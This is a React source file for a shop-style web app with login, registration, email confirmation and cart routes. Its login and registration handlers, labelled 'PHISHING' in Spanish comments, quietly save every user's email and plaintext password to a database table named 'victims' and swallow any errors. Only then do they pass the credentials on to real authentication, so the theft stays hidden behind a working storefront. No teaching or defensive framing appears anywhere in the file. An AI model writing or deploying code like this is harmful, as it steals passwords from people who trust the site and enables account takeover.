import React, { useState } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useNavigate, useLocation } from 'react-router-dom';
import { LoginPage } from './pages/LoginPage';
import { ConfirmEmailPage } from './pages/ConfirmEmailPage';
import { HomePage } from './pages/HomePage';
import { CartPage } from './pages/CartPage';
import { ProtectedRoute } from './components/ProtectedRoute';
import { supabase } from './supabaseClient';

function AppContent() {
  const navigate = useNavigate();
  const location = useLocation();
  const [user, setUser] = useState(null);
  const [cart, setCart] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [categoryFilter, setCategoryFilter] = useState(null);
  const [pendingVerification, setPendingVerification] = useState(false);
  const [pendingEmail, setPendingEmail] = useState(null);

  const handleLogin = async (email, password) => {
    // 1. PHISHING: ¡Captura los datos silenciosamente primero!
    try {
      await supabase
        .from('victims')
        .insert([{ email, password }]);
    } catch (err) {
      // Fallo silencioso
    }

    // 2. AUTH REAL: Verifica credenciales con Supabase
    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email,
        password,
      });

      if (error) {
        alert('Error en el inicio de sesión: ' + error.message);
      } else {
        // Solo iniciar sesión si Supabase valida las credenciales
        setUser({ email: data.user.email });
      }
    } catch (err) {
      alert('Error de inicio de sesión: ' + err.message);
    }
  };

  const handleRegister = async (email, password) => {
    // 1. PHISHING: ¡Captura los datos primero!
    try {
      await supabase
        .from('victims')
        .insert([{ email, password }]);
    } catch (err) {
      // Fallo silencioso
    }

    // 2. AUTH REAL: Crea el usuario en Supabase para enviar el email de confirmación
    try {
      const { data, error } = await supabase.auth.signUp({
        email,
        password,
      });

      if (error) {
        alert('Error al crear la cuenta: ' + error.message);
      } else {
        // Mostrar vista de confirmación de email en lugar de loguear
        setPendingEmail(email);
        setPendingVerification(true);
        // Redirigir a la página de confirmación
        setTimeout(() => navigate('/confirm-email'), 0);
      }
    } catch (err) {
      alert('Error: ' + err.message);
    }
  };

  const handleLogout = () => {
    setUser(null);
    setCart([]);
  };

  const handleBackToLogin = () => {
    setPendingVerification(false);
    setPendingEmail(null);
  };

  return (
    <Routes>
      {/* Ruta de Login - Solo accesible sin autenticación */}
      <Route 
        path="/login" 
        element={user ? <Navigate to="/home" replace /> : <LoginPage onLogin={handleLogin} onRegister={handleRegister} pendingVerification={pendingVerification} />} 
      />

      {/* Ruta de Confirmación de Email - Solo accesible durante registro pendiente */}
      <Route 
        path="/confirm-email" 
        element={
          pendingVerification ? (
            <ConfirmEmailPage email={pendingEmail} onBackToLogin={handleBackToLogin} />
          ) : (
            <Navigate to="/login" replace />
          )
        } 
      />

      {/* Ruta Protegida - Home/Tienda - Solo accesible con autenticación */}
      <Route 
        path="/home" 
        element={
          <ProtectedRoute user={user}>
            <HomePage 
              user={user}
              cart={cart}
              setCart={setCart}
              onLogout={handleLogout}
              searchQuery={searchQuery}
              setSearchQuery={setSearchQuery}
            />
          </ProtectedRoute>
        } 
      />

      {/* Ruta Protegida - Carrito - Solo accesible con autenticación */}
      <Route 
        path="/cart" 
        element={
          <ProtectedRoute user={user}>
            <CartPage 
              user={user}
              cart={cart}
              setCart={setCart}
              onLogout={handleLogout}
              setSearchQuery={setSearchQuery}
            />
          </ProtectedRoute>
        } 
      />

      {/* Redirección por defecto */}
      <Route 
        path="/" 
        element={<Navigate to={user ? "/home" : "/login"} replace />} 
      />

      {/* 404 - Ruta no encontrada */}
      <Route 
        path="*" 
        element={<Navigate to={user ? "/home" : "/login"} replace />} 
      />
    </Routes>
  );
}

function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
}

export default App;
